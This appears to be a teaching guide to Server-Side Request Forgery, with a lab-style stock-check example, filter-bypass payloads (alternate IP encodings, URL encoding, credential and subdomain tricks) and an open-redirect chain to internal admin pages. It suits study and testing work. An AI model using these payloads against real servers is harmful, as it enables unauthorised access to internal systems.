# SSRF Exploitation Techniques

## Overview

Server-Side Request Forgery (SSRF) occurs when an application allows attackers to cause the server to make requests to unintended locations.

Instead of interacting directly with a target, the attacker abuses the vulnerable server as a proxy to access internal resources, privileged endpoints, or restricted systems.

---

# Common SSRF Attack Scenarios

SSRF attacks commonly exploit trust relationships between:

* The application and itself
* The application and internal systems
* The application and cloud services
* The application and trusted network resources

---

# 1. SSRF Against the Application Server

## Concept

In this attack, the vulnerable application is tricked into making requests back to itself through the loopback interface.

Common loopback targets:

```text
127.0.0.1
localhost
```

---

## Example Scenario

An e-commerce application checks stock availability by requesting an internal API.

### Original Request

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

The server fetches stock information and returns the result.

---

## Exploiting SSRF

Modify the request:

```http
POST /product/stock HTTP/1.1

stockApi=http://localhost/admin
```

---

## What Happens?

The application server sends a request to:

```text
http://localhost/admin
```

and returns the response.

---

## Potential Impact

Access to:

* Administrative panels
* Internal APIs
* Debug interfaces
* Management consoles
* Sensitive configuration endpoints

---

# Why Does This Work?

Applications often trust requests originating from the local machine.

Common reasons include:

### Internal Access Controls

Security checks may exist in a reverse proxy or firewall.

Internal requests bypass these controls.

---

### Disaster Recovery Features

Administrators may be allowed direct access from localhost without authentication.

---

### Internal-Only Services

Administrative interfaces may only listen on:

```text
127.0.0.1
localhost
```

and are not accessible externally.

---

# Attacker Workflow

## Step 1

Find SSRF parameter:

```text
stockApi=
url=
callback=
feed=
webhook=
```

---

## Step 2

Replace with:

```text
http://localhost
```

---

## Step 3

Enumerate internal endpoints:

```text
http://localhost/admin
http://localhost/login
http://localhost/dashboard
http://localhost/server-status
```

---

# 2. SSRF Against Internal Back-End Systems

## Concept

Applications often communicate with internal services unavailable to external users.

These systems typically reside on private IP ranges.

---

## Common Private Networks

```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

---

## Example Internal Target

```text
http://192.168.0.68/admin
```

---

## Exploit Request

```http
POST /product/stock HTTP/1.1

stockApi=http://192.168.0.68/admin
```

---

## Why Internal Systems Are Dangerous

Internal services often:

* Lack authentication
* Have weak security controls
* Expose sensitive functions
* Assume only trusted users can access them

---

## Potential Impact

* User management access
* Internal API access
* Database administration panels
* Monitoring dashboards
* Source code repositories
* Internal documentation

---

# SSRF Testing Methodology

## Test Loopback Interface

```text
http://127.0.0.1
http://localhost
```

---

## Test Private IP Ranges

```text
http://192.168.0.1
http://192.168.0.10
http://10.0.0.1
http://172.16.0.1
```

---

## Look For Responses

Indicators include:

* Different content length
* Status code changes
* New page content
* Internal application banners

---

# Circumventing SSRF Defenses

Applications frequently attempt to block SSRF using filters.

These filters are often bypassable.

---

# 3. SSRF With Blacklist-Based Filters

## Common Blacklisted Values

```text
127.0.0.1
localhost
/admin
```

---

## Bypass 1: Alternative IP Representations

### Decimal

```text
2130706433
```

Equivalent to:

```text
127.0.0.1
```

---

### Octal

```text
017700000001
```

Equivalent to:

```text
127.0.0.1
```

---

### Shortened Notation

```text
127.1
```

Equivalent to:

```text
127.0.0.1
```

---

## Bypass 2: DNS Resolution

Register a domain pointing to:

```text
127.0.0.1
```

Example:

```text
attacker-controlled-domain.com
```

↓

```text
127.0.0.1
```

---

## Bypass 3: URL Encoding

Encode blocked characters.

Example:

```text
/admin
```

↓

```text
%61dmin
```

---

## Bypass 4: Case Variation

Some filters are case-sensitive.

Example:

```text
/AdMiN
```

---

## Bypass 5: Redirection

Host a URL that redirects to:

```text
http://127.0.0.1/admin
```

The application may validate the first URL but follow the redirect.

---

# 4. SSRF With Whitelist-Based Filters

## Scenario

The application only allows approved domains.

Example:

```text
https://trusted-domain.com
```

---

# Bypass 1: Credentials Injection

Use:

```text
https://trusted-domain.com:password@evil-site.com
```

The real destination becomes:

```text
evil-site.com
```

---

# Bypass 2: URL Fragment Trick

```text
https://evil-site.com#trusted-domain.com
```

Some filters incorrectly validate the fragment.

---

# Bypass 3: Subdomain Abuse

```text
https://trusted-domain.com.evil-site.com
```

The actual host remains:

```text
evil-site.com
```

---

# Bypass 4: URL Encoding

Encode characters to create parsing inconsistencies.

Example:

```text
%2e
%2f
%40
```

---

# 5. Bypassing SSRF Filters via Open Redirect

## Concept

If a whitelisted application contains an Open Redirect vulnerability, it may be used to bypass SSRF protections.

---

## Vulnerable Redirect Endpoint

```text
/product/nextProduct?currentProductId=6&path=http://attacker.com
```

Response:

```http
302 Redirect
Location: http://attacker.com
```

---

## SSRF Exploit

```http
POST /product/stock HTTP/1.1

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

---

## Attack Flow

### Step 1

Application validates:

```text
weliketoshop.net
```

Approved domain.

---

### Step 2

Application requests:

```text
weliketoshop.net
```

---

### Step 3

Open Redirect triggers.

---

### Step 4

Application follows redirect.

---

### Step 5

Request reaches:

```text
http://192.168.0.68/admin
```

---

### Step 6

Internal resource becomes accessible.

---

# SSRF Hunter Checklist

Whenever testing an application, ask:

* Does the server fetch URLs?
* Can I control the destination?
* Can I access localhost?
* Can I access private IP ranges?
* Is there an Open Redirect available?
* Are blacklist filters in place?
* Are whitelist filters in place?
* Can redirects be followed?

If the answer is yes to any of these questions, SSRF should immediately become a testing priority.

---

# Key Takeaway

The most valuable SSRF skill is not memorizing payloads.

The most valuable skill is identifying functionality where:

```text
User Input
     ↓
Server Request
     ↓
Attacker Controls Destination
```

Once you identify this pattern, SSRF testing becomes systematic and significantly easier.
